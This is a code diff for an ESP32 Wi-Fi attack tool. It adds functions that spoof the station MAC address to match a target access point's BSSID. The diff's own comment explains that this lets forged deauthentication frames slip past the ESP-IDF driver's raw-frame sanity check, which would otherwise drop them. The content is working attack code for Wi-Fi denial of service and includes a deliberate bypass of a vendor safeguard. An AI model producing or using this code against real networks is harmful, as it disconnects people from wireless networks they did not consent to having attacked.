@@ -30,6 +30,30 @@
 #include <esp_wifi.h>
 #include <string.h>
 
+/*
+ * Spoof the STA interface MAC so esp_wifi_80211_tx passes the stock
+ * ESP-IDF blob's ieee80211_raw_frame_sanity_check. That check rejects
+ * any frame whose addr2 doesn't match the interface's MAC — our deauth
+ * frames spoof the AP's BSSID as addr2 (correct per 802.11), so every
+ * frame gets silently dropped at the driver layer unless we spoof the
+ * STA's MAC to match the BSSID we're impersonating.
+ *
+ * set_mac must be called while WiFi is STOPPED, not merely initialized,
+ * so we stop-set-start around it. Returns ESP_OK on success.
+ */
+static inline esp_err_t wifi_spoof_sta_mac(const uint8_t mac[6])
+{
+    esp_wifi_stop();
+    esp_err_t rc = esp_wifi_set_mac(WIFI_IF_STA, mac);
+    esp_wifi_start();
+    return rc;
+}
+
+static inline void wifi_save_sta_mac(uint8_t out[6])
+{
+    esp_wifi_get_mac(WIFI_IF_STA, out);
+}
+
 static inline void _deauth_stamp_seq(uint8_t *f, uint16_t seq)
 {
     uint16_t s = seq & 0x0FFF;
